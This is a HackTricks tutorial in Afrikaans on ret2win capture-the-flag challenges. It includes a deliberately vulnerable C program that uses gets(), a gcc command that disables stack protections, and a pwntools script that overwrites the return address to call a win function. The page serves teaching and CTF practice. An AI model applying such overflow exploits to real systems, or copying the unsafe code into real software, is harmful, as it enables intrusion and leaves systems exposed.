# Ret2win

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

**Ret2win**-uitdagings is 'n gewilde kategorie in **Capture The Flag (CTF)**-kompetisies, veral in take wat **bin√™re uitbuiting** behels. Die doel is om 'n kwesbaarheid in 'n gegewe bin√™re l√™er uit te buit om 'n spesifieke, onaangeroepe funksie binne die bin√™re l√™er uit te voer, dikwels iets soos `win`, `flag`, ens. Hierdie funksie druk gewoonlik 'n vlag of 'n suksesboodskap uit wanneer dit uitgevoer word. Die uitdaging behels tipies die oorskrywing van die **terugkeeradres** op die stapel om die uitvoervloei na die gewenste funksie te stuur. Hier is 'n meer gedetailleerde verduideliking met voorbeelde:

### C-voorbeeld

Beskou 'n eenvoudige C-program met 'n kwesbaarheid en 'n `win`-funksie wat ons beoog om te roep:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Om hierdie program te kompileer sonder stapelbeskerming en met ASLR gedeaktiveer, kan jy die volgende bevel gebruik:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompileer die program as 'n 32-bis bin√™re (dit is opsioneel maar algemeen in CTF-uitdagings).
* `-fno-stack-protector`: Deaktiveer beskerming teen stoor oorvloei.
* `-z execstack`: Staan die uitvoering van kode op die stoor toe.
* `-no-pie`: Deaktiveer Posisioneel Onafhanklike Uitvoerbare om te verseker dat die adres van die `win`-funksie nie verander nie.
* `-o vulnerable`: Noem die uitvoer l√™er `vulnerable`.

### Python Exploit met behulp van Pwntools

Vir die uitbuiting, sal ons **pwntools** gebruik, 'n kragtige CTF-raamwerk vir die skryf van uitbuitings. Die uitbuitingskrip sal 'n lading skep om die buffer te oorvloei en die terugkeeradres met die adres van die `win`-funksie te oorskryf.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Om die adres van die `win` funksie te vind, kan jy **gdb**, **objdump**, of enige ander gereedskap gebruik wat jou in staat stel om bin√™re l√™ers te inspekteer. Byvoorbeeld, met `objdump`, kan jy gebruik:
```sh
objdump -d vulnerable | grep win
```
Hierdie bevel sal jou die samestelling van die `win`-funksie wys, insluitend sy beginadres.

Die Python-skrip stuur 'n sorgvuldig saamgestelde boodskap wat, wanneer verwerk deur die `vulnerable_function`, die buffer oorloop en die terugkeeradres op die stok met die adres van `win` oorskryf. Wanneer `vulnerable_function` terugkeer, spring dit na `win` in plaas daarvan om na `main` terug te keer of af te sluit, en die boodskap word gedruk.

## Beskermings

* [**PIE**](../common-binary-protections-and-bypasses/pie/) **moet gedeaktiveer word** sodat die adres betroubaar oor uitvoerings heen is, anders sal die adres waar die funksie gestoor word nie altyd dieselfde wees nie en sal jy 'n lek nodig h√™ om uit te vind waar die `win`-funksie gelaai word. In sommige gevalle, wanneer die funksie wat die oorloop veroorsaak `read` of soortgelyk is, kan jy 'n **Gedeeltelike Oorskrywing** van 1 of 2 byte doen om die terugkeeradres te verander na die `win`-funksie. As gevolg van hoe ASLR werk, is die laaste drie heks-nibbles nie willekeurig nie, so daar is 'n **1/16 kans** (1 nibble) om die korrekte terugkeeradres te kry.
* [**Stokkanaries**](../common-binary-protections-and-bypasses/stack-canaries/) moet ook gedeaktiveer word, anders sal die gekompromitteerde EIP-terugkeeradres nooit gevolg word nie.

## Ander voorbeelde & Verwysings

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32-bis, geen ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bits met ASLR, met 'n lek van die bin-adres
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bits, geen ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bits, geen ASLR, dubbele klein oorloop, eerste om die stok te oorloop en die grootte van die tweede oorloop te vergroot
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bit, relro, geen kanarie, nx, geen pie, formaatstring om die adres `fflush` met die `win`-funksie (ret2win) te oorskryf
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bit, nx, niks anders, gedeeltelike oorskrywing van EIP (1Byte) om die `win`-funksie te roep
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bit, nx, niks anders, gedeeltelike oorskrywing van EIP (1Byte) om die `win`-funksie te roep
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Die program valideer slegs die laaste byte van 'n nommer om vir die grootte van die inset te kyk, daarom is dit moontlik om enige grootte by te voeg solank die laaste byte binne die toegelate reeks is. Dan skep die inset 'n bufferoorloop wat uitgebuit word met 'n ret2win.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bit, relro, geen kanarie, nx, pie. Gedeeltelike oorskrywing om die `win`-funksie te roep (ret2win)
